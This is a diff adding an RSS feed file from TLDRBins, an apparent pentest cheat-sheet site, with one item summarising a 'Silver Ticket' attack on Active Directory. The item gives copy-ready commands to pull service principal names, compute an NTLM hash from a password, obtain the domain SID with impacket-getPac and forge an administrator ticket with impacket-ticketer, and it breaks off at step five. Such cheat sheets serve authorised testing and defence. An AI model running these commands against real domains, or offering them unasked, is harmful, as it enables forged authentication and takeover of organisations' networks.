@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Sidhistory on TLDRBins</title>
+    <link>https://tldrbins.github.io/@sidhistory/</link>
+    <description>Recent content in Sidhistory on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@sidhistory/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Silver Ticket</title>
+      <link>https://tldrbins.github.io/silver_ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/silver_ticket/</guid>
+      <description>Silver Ticket Attack Linux Windows 1. Get service principle name (SPN) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -request -k # If NTLM auth is disabled sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-host &amp;lt;DC&amp;gt; -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;) | openssl dgst -md4 3. Get domain SID sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getPac -targetUser administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; 4. Generate Silver Ticket impacket-ticketer -nthash &amp;lt;HASH&amp;gt; -domain-sid &amp;lt;SID&amp;gt; -domain &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC&amp;gt; -spn &amp;lt;SPN&amp;gt; administrator 5.</description>
+    </item>
+  </channel>
+</rss>
